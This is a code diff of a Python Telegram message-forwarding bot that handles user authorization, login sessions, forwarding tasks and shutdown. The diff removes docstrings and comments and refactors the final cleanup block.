     context.user_data["owner_action"] = "remove_user"
     context.user_data["awaiting_input"] = True
 
 async def handle_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle remove user input and show confirmation"""
     user_id = update.effective_user.id
     text = update.message.text.strip()
     
@@ -2097,7 +1950,6 @@ async def handle_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE)
         context.user_data.clear()
         return
     
-    # Store target user ID and show confirmation
     context.user_data["remove_user_id"] = target_user_id
     
     message_text = f"""⚠️ **Confirm User Removal**
@@ -2127,18 +1979,15 @@ This will:
         parse_mode="Markdown"
     )
     
-    # Clear input state but keep remove_user_id for confirmation
     context.user_data["awaiting_input"] = False
 
 async def handle_confirm_remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE, target_user_id: int):
-    """Confirm and execute user removal"""
     query = update.callback_query
     user_id = query.from_user.id
     
     removed = await db_call(db.remove_allowed_user, target_user_id)
     
     if removed:
-        # Disconnect user if they're connected
         if target_user_id in user_clients:
             try:
                 client = user_clients[target_user_id]
@@ -2156,13 +2005,11 @@ async def handle_confirm_remove_user(update: Update, context: ContextTypes.DEFAU
             finally:
                 user_clients.pop(target_user_id, None)
 
-        # Update user status in database
         try:
             await db_call(db.save_user, target_user_id, None, None, None, False)
         except Exception:
             pass
 
-        # Clear user data
         user_session_strings.pop(target_user_id, None)
         phone_verification_states.pop(target_user_id, None)
         tasks_cache.pop(target_user_id, None)
@@ -2188,10 +2035,7 @@ async def handle_confirm_remove_user(update: Update, context: ContextTypes.DEFAU
     
     context.user_data.clear()
 
-# =================== BUTTON HANDLER ===================
-
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Button callback handler"""
     query = update.callback_query
     user_id = query.from_user.id
 
@@ -2207,7 +2051,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     action = query.data
     
-    # Handle main menu actions
     if action == "login":
         await query.message.delete()
         await login_command(update, context)
@@ -2240,14 +2083,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif action == "owner_panel":
         await show_owner_panel(update, context)
     
-    # Handle owner panel actions
     elif action.startswith("owner_"):
         await handle_owner_actions(update, context)
 
-# =================== TASK MANAGEMENT ===================
-
 async def forwadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start task creation"""
     user_id = update.effective_user.id
 
     if not await check_authorization(update, context):
@@ -2278,7 +2117,6 @@ async def forwadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle task creation steps"""
     user_id = update.effective_user.id
     text = update.message.text.strip()
 
@@ -2401,7 +2239,6 @@ async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYP
                 del task_creation_states[user_id]
         return
     
-    # Handle owner input states
     if context.user_data.get("awaiting_input"):
         action = context.user_data.get("owner_action")
         
@@ -2413,7 +2250,6 @@ async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYP
             await handle_remove_user(update, context)
         return
     
-    # Handle login/logout processes
     if user_id in login_states:
         await handle_login_process(update, context)
         return
@@ -2423,13 +2259,11 @@ async def handle_task_creation(update: Update, context: ContextTypes.DEFAULT_TYP
         if handled:
             return
     
-    # Handle prefix/suffix input
     if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
         await handle_prefix_suffix_input(update, context)
         return
 
 async def fortasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """List user tasks"""
     user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
 
     if not await check_authorization(update, context):
@@ -2468,7 +2302,6 @@ async def fortasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def handle_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show task management menu"""
     query = update.callback_query
     user_id = query.from_user.id
     task_label = query.data.replace("task_", "")
@@ -2517,7 +2350,6 @@ async def handle_task_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def handle_filter_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show filter management menu"""
     query = update.callback_query
     user_id = query.from_user.id
     task_label = query.data.replace("filter_", "")
@@ -2577,7 +2409,6 @@ async def handle_filter_menu(update: Update, context: ContextTypes.DEFAULT_TYPE)
     )
 
 async def handle_toggle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle toggle actions"""
     query = update.callback_query
     user_id = query.from_user.id
     data_parts = query.data.replace("toggle_", "").split("_")
@@ -2702,7 +2533,6 @@ async def handle_toggle_action(update: Update, context: ContextTypes.DEFAULT_TYP
     )
 
 async def show_prefix_suffix_menu(query, task_label):
-    """Show prefix/suffix menu"""
     user_id = query.from_user.id
     
     user_tasks = tasks_cache.get(user_id, [])
@@ -2737,7 +2567,6 @@ async def show_prefix_suffix_menu(query, task_label):
     )
 
 async def handle_prefix_suffix(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle prefix/suffix setup"""
     query = update.callback_query
     user_id = query.from_user.id
     data_parts = query.data.split("_")
@@ -2756,7 +2585,6 @@ async def handle_prefix_suffix(update: Update, context: ContextTypes.DEFAULT_TYP
     )
 
 async def handle_prefix_suffix_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle prefix/suffix input"""
     user_id = update.effective_user.id
     text = update.message.text.strip()
     
@@ -2810,7 +2638,6 @@ async def handle_prefix_suffix_input(update: Update, context: ContextTypes.DEFAU
     )
 
 async def handle_delete_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle task deletion"""
     query = update.callback_query
     user_id = query.from_user.id
     task_label = query.data.replace("delete_", "")
@@ -2836,7 +2663,6 @@ async def handle_delete_action(update: Update, context: ContextTypes.DEFAULT_TYP
     )
 
 async def handle_confirm_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Confirm and execute deletion"""
     query = update.callback_query
     user_id = query.from_user.id
     task_label = query.data.replace("confirm_delete_", "")
@@ -2862,10 +2688,7 @@ async def handle_confirm_delete(update: Update, context: ContextTypes.DEFAULT_TY
             parse_mode="Markdown"
         )
 
-# =================== LOGIN/LOGOUT SYSTEM ===================
-
 async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start login process"""
     user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
 
     if not await check_authorization(update, context):
@@ -2911,7 +2734,6 @@ async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle login process steps"""
     user_id = update.effective_user.id
     text = update.message.text.strip()
 
@@ -3150,7 +2972,6 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
             del login_states[user_id]
 
 async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start logout process"""
     user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
 
     if not await check_authorization(update, context):
@@ -3178,7 +2999,6 @@ async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def handle_logout_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """Handle logout confirmation"""
     user_id = update.effective_user.id
 
     if user_id not in logout_states:
@@ -3230,10 +3050,7 @@ async def handle_logout_confirmation(update: Update, context: ContextTypes.DEFAU
     )
     return True
 
-# =================== CHAT ID MANAGEMENT ===================
-
 async def getallid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Get all chat IDs"""
     user_id = update.effective_user.id
 
     if not await check_authorization(update, context):
@@ -3253,7 +3070,6 @@ async def getallid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await show_chat_categories(user_id, update.message.chat.id, None, context)
 
 async def show_chat_categories(user_id: int, chat_id: int, message_id: int, context: ContextTypes.DEFAULT_TYPE):
-    """Show chat categories"""
     if user_id not in user_clients:
         return
 
@@ -3283,7 +3099,6 @@ async def show_chat_categories(user_id: int, chat_id: int, message_id: int, cont
         await context.bot.send_message(chat_id=chat_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
 
 async def show_categorized_chats(user_id: int, chat_id: int, message_id: int, category: str, page: int, context: ContextTypes.DEFAULT_TYPE):
-    """Show categorized chats"""
     from telethon.tl.types import User, Channel, Chat
 
     if user_id not in user_clients:
@@ -3348,10 +3163,7 @@ async def show_categorized_chats(user_id: int, chat_id: int, message_id: int, ca
 
     await context.bot.edit_message_text(chat_list, chat_id=chat_id, message_id=message_id, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
 
-# =================== FORWARDING CORE ===================
-
 def ensure_handler_registered_for_user(user_id: int, client: TelegramClient):
-    """Register message handler for user"""
     if handler_registered.get(user_id):
         return
 
@@ -3409,7 +3221,6 @@ def ensure_handler_registered_for_user(user_id: int, client: TelegramClient):
         logger.exception("Failed to add event handler")
 
 async def resolve_target_entity_once(user_id: int, client: TelegramClient, target_id: int):
-    """Resolve target entity"""
     ent = _get_cached_target(user_id, target_id)
     if ent:
         return ent
@@ -3422,7 +3233,6 @@ async def resolve_target_entity_once(user_id: int, client: TelegramClient, targe
         return None
 
 async def resolve_targets_for_user(user_id: int, target_ids: List[int]):
-    """Resolve targets for user"""
     client = user_clients.get(user_id)
     if not client:
         return
@@ -3434,7 +3244,6 @@ async def resolve_targets_for_user(user_id: int, target_ids: List[int]):
             await asyncio.sleep(TARGET_RESOLVE_RETRY_SECONDS)
 
 async def send_worker_loop(worker_id: int):
-    """Send worker loop"""
     logger.info(f"Send worker {worker_id} started")
     global send_queue
     if send_queue is None:
@@ -3509,7 +3318,6 @@ async def send_worker_loop(worker_id: int):
                 pass
 
 async def start_send_workers():
-    """Start send workers"""
     global _send_workers_started, send_queue, worker_tasks
     if _send_workers_started:
         return
@@ -3525,7 +3333,6 @@ async def start_send_workers():
     logger.info(f"Spawned {SEND_WORKER_COUNT} send workers")
 
 async def start_forwarding_for_user(user_id: int):
-    """Start forwarding for user - FIXED VERSION"""
     if user_id not in user_clients:
         return
 
@@ -3535,10 +3342,8 @@ async def start_forwarding_for_user(user_id: int):
     _ensure_user_send_semaphore(user_id)
     _ensure_user_rate_limiter(user_id)
 
-    # Register handler FIRST
     ensure_handler_registered_for_user(user_id, client)
     
-    # Resolve targets for active tasks
     user_tasks = tasks_cache.get(user_id, [])
     if user_tasks:
         all_targets = []
@@ -3547,16 +3352,11 @@ async def start_forwarding_for_user(user_id: int):
         
         if all_targets:
             unique_targets = list(set(all_targets))
-            # Start async resolution without waiting
             asyncio.create_task(resolve_targets_for_user(user_id, unique_targets))
 
-# =================== SESSION RESTORATION ===================
-
 async def restore_sessions():
-    """Restore sessions from env and database - FIXED VERSION"""
     logger.info("🔄 Restoring sessions...")
 
-    # From environment
     for user_id, session_string in USER_SESSIONS.items():
         if len(user_clients) >= MAX_CONCURRENT_USERS:
             continue
@@ -3566,7 +3366,6 @@ async def restore_sessions():
         except Exception:
             pass
 
-    # From database
     try:
         users = await asyncio.to_thread(lambda: db.get_logged_in_users(MAX_CONCURRENT_USERS * 2))
     except Exception:
@@ -3589,7 +3388,6 @@ async def restore_sessions():
             "filters": t.get("filters", {})
         })
 
-    # Restore in batches
     batch_size = 3
     restore_tasks = []
     for row in users:
@@ -3610,7 +3408,6 @@ async def restore_sessions():
         await asyncio.gather(*restore_tasks, return_exceptions=True)
 
 async def restore_single_session(user_id: int, session_data: str, from_env: bool = False):
-    """Restore single session - FIXED VERSION"""
     try:
         client = TelegramClient(StringSession(session_data), API_ID, API_HASH)
         await client.connect()
@@ -3641,15 +3438,12 @@ async def restore_single_session(user_id: int, session_data: str, from_env: bool
                             session_data, 
                             True)
                 
-                # Initialize all caches and handlers FIRST
                 target_entity_cache.setdefault(user_id, OrderedDict())
                 _ensure_user_send_semaphore(user_id)
                 _ensure_user_rate_limiter(user_id)
                 
-                # Start forwarding immediately
                 await start_forwarding_for_user(user_id)
                 
-                # Resolve targets for this user's tasks
                 user_tasks = tasks_cache.get(user_id, [])
                 if user_tasks:
                     all_targets = []
@@ -3658,7 +3452,6 @@ async def restore_single_session(user_id: int, session_data: str, from_env: bool
                     
                     if all_targets:
                         unique_targets = list(set(all_targets))
-                        # Start async resolution - don't wait for it
                         asyncio.create_task(resolve_targets_for_user(user_id, unique_targets))
                 
                 source = "environment variable" if from_env else "database"
@@ -3666,7 +3459,6 @@ async def restore_single_session(user_id: int, session_data: str, from_env: bool
                 
             except Exception as e:
                 logger.exception(f"Error in restore_single_session for user {user_id}: {e}")
-                # Even if there's an error, try to start forwarding
                 try:
                     target_entity_cache.setdefault(user_id, OrderedDict())
                     _ensure_user_send_semaphore(user_id)
@@ -3685,13 +3477,9 @@ async def restore_single_session(user_id: int, session_data: str, from_env: bool
             except Exception:
                 pass
 
-# =================== SHUTDOWN CLEANUP ===================
-
 async def shutdown_cleanup():
-    """Cleanup on shutdown"""
     logger.info("Shutdown cleanup...")
 
-    # Cancel worker tasks
     for t in list(worker_tasks):
         try:
             t.cancel()
@@ -3703,7 +3491,6 @@ async def shutdown_cleanup():
         except Exception:
             pass
 
-    # Disconnect clients
     user_ids = list(user_clients.keys())
     batch_size = 5
     for i in range(0, len(user_ids), batch_size):
@@ -3741,7 +3528,6 @@ async def shutdown_cleanup():
             except Exception:
                 pass
 
-    # Clear caches
     user_clients.clear()
     user_session_strings.clear()
     phone_verification_states.clear()
@@ -3756,17 +3542,13 @@ async def shutdown_cleanup():
 
     logger.info("Shutdown cleanup complete.")
 
-# =================== MESSAGE HANDLING ===================
-
 async def handle_all_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle all text messages"""
     user_id = update.effective_user.id
     
     if user_id in phone_verification_states:
         await handle_phone_verification(update, context)
         return
     
-    # Handle owner input states
     if context.user_data.get("awaiting_input"):
         action = context.user_data.get("owner_action")
         
@@ -3804,10 +3586,7 @@ async def handle_all_text_messages(update: Update, context: ContextTypes.DEFAULT
         parse_mode="Markdown"
     )
 
-# =================== INITIALIZATION ===================
-
 async def post_init(application: Application):
-    """Post initialization"""
     global MAIN_LOOP
     MAIN_LOOP = asyncio.get_running_loop()
 
@@ -3816,7 +3595,6 @@ async def post_init(application: Application):
     await application.bot.delete_webhook(drop_pending_updates=True)
     logger.info("🧹 Cleared webhooks")
 
-    # Signal handling
     def _signal_handler(sig_num, frame):
         logger.info(f"Signal {sig_num} received")
         try:
@@ -3835,7 +3613,6 @@ async def post_init(application: Application):
     except Exception:
         pass
 
-    # Add owners from env
     if OWNER_IDS:
         for oid in OWNER_IDS:
             try:
@@ -3845,7 +3622,6 @@ async def post_init(application: Application):
             except Exception:
                 pass
 
-    # Add allowed users from env
     if ALLOWED_USERS:
         for au in ALLOWED_USERS:
             try:
@@ -3856,7 +3632,6 @@ async def post_init(application: Application):
     await start_send_workers()
     await restore_sessions()
 
-    # Metrics collection
     async def _collect_metrics():
         try:
             q = send_queue.qsize() if send_queue is not None else None
@@ -3887,13 +3662,11 @@ async def post_init(application: Application):
     except Exception:
         pass
 
-    # Start web server
     web_server.start()
     
     logger.info("✅ Bot initialized!")
 
 async def _graceful_shutdown(application: Application):
-    """Graceful shutdown"""
     try:
         await shutdown_cleanup()
     except Exception:
@@ -3904,7 +3677,6 @@ async def _graceful_shutdown(application: Application):
         pass
 
 def _get_memory_usage_mb():
-    """Get memory usage"""
     try:
         import psutil
         process = psutil.Process()
@@ -3912,10 +3684,7 @@ def _get_memory_usage_mb():
     except ImportError:
         return None
 
-# =================== MAIN ===================
-
 def main():
-    """Main entry point"""
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not found")
         return
@@ -3929,7 +3698,6 @@ def main():
 
     application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
 
-    # Register handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("login", login_command))
     application.add_handler(CommandHandler("logout", logout_command))
@@ -3940,51 +3708,40 @@ def main():
     application.add_handler(CallbackQueryHandler(button_handler))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text_messages))
 
-    # Remove old owner commands
-    # application.add_handler(CommandHandler("adduser", adduser_command))  # REMOVED
-    # application.add_handler(CommandHandler("removeuser", removeuser_command))  # REMOVED
-    # application.add_handler(CommandHandler("listusers", listusers_command))  # REMOVED
-    # application.add_handler(CommandHandler("getallstring", getallstring_command))  # REMOVED
-    # application.add_handler(CommandHandler("getuserstring", getuserstring_command))  # REMOVED
-
     logger.info("✅ Bot ready!")
     try:
         application.run_polling(drop_pending_updates=True)
     finally:
-        # Fallback cleanup
+        loop_to_use = None
         try:
-            loop_to_use = None
-            try:
-                if MAIN_LOOP is not None and getattr(MAIN_LOOP, "is_running", lambda: False)():
-                    loop_to_use = MAIN_LOOP
-                else:
-                    try:
-                        running_loop = asyncio.get_running_loop()
-                        if getattr(running_loop, "is_running", lambda: False)():
-                            loop_to_use = running_loop
-                    except RuntimeError:
-                        loop_to_use = None
-            except Exception:
-                loop_to_use = None
-
-            if loop_to_use:
+            if MAIN_LOOP is not None and getattr(MAIN_LOOP, "is_running", lambda: False)():
+                loop_to_use = MAIN_LOOP
+            else:
                 try:
-                    future = asyncio.run_coroutine_threadsafe(shutdown_cleanup(), loop_to_use)
-                    future.result(timeout=30)
+                    running_loop = asyncio.get_running_loop()
+                    if getattr(running_loop, "is_running", lambda: False)():
+                        loop_to_use = running_loop
+                except RuntimeError:
+                    loop_to_use = None
+        except Exception:
+            loop_to_use = None
+
+        if loop_to_use:
+            try:
+                future = asyncio.run_coroutine_threadsafe(shutdown_cleanup(), loop_to_use)
+                future.result(timeout=30)
+            except Exception:
+                pass
+        else:
+            tmp_loop = asyncio.new_event_loop()
+            try:
+                asyncio.set_event_loop(tmp_loop)
+                tmp_loop.run_until_complete(shutdown_cleanup())
+            finally:
+                try:
+                    tmp_loop.close()
                 except Exception:
                     pass
-            else:
-                tmp_loop = asyncio.new_event_loop()
-                try:
-                    asyncio.set_event_loop(tmp_loop)
-                    tmp_loop.run_until_complete(shutdown_cleanup())
-                finally:
-                    try:
-                        tmp_loop.close()
-                    except Exception:
-                        pass
-        except Exception:
-            pass
 
 if __name__ == "__main__":
     main()
